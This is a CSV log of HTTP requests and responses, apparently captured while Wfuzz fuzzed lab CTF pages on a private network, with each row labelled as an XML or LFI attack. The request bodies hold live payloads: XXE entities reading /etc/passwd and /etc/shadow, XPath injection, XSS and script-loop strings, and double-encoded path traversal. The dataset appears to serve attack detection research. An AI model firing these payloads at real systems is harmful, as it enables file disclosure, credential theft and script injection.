attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port,res_header_Connection,req_header_Connection
xml,192.168.60.165,80,"username=<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",*/*,145.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51814,,
xml,192.168.60.165,80,"username=<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",*/*,144.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51830,,
xml,192.168.60.165,80,username=x' or name()='username' or 'x'='y,*/*,42.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51846,,
xml,192.168.60.165,80,username=<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,*/*,63.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51850,,
xml,192.168.60.165,80,username=<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,*/*,87.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51856,,
xml,192.168.60.165,80,"username=<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",*/*,141.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51866,,
xml,192.168.60.165,80,"username=<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",*/*,85.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51868,,
xml,192.168.60.165,80,"username=<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",*/*,218.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51874,,
xml,192.168.60.165,80,"username=<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",*/*,145.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51878,,
xml,192.168.60.165,80,"username=<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",*/*,145.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/csccCTF/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",358.0,text/html; charset=UTF-8,"Tue, 07 Feb 2023 10:26:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,51884,,
lfi,192.168.60.165,80,filename=%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html,*/*,97.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44888,close,
lfi,192.168.60.165,80,filename=..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd;index.html,*/*,73.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44876,close,
lfi,192.168.60.165,80,filename=..%255c..%255c..%255c..%255c/etc/passwd;index.html,*/*,59.0,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/lfi/lfi1.php," <!DOCTYPE html> <html lang=""en""> <head>     <meta charset=""UTF-8"">     <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">     <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">     <title>Simple file explorer</title>     <style>         .container{             margin: 0 5px 0 5px;             display: flex;         }         .container textarea {                 margin: 5px 0 0 5px;         }     </style> </head> <body>          <form method=""GET"">             <input type=""text"" name=""filename"" require>             <input type=""submit"" name=""submit"">         </form>         <div class=""container"">                 <textarea name=""file"" id=""file"" cols=""268"" rows=""40""></textarea>         </div> </body> </html>",768.0,text/html; charset=UTF-8,"Mon, 27 Feb 2023 09:12:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.60.157,44904,close,
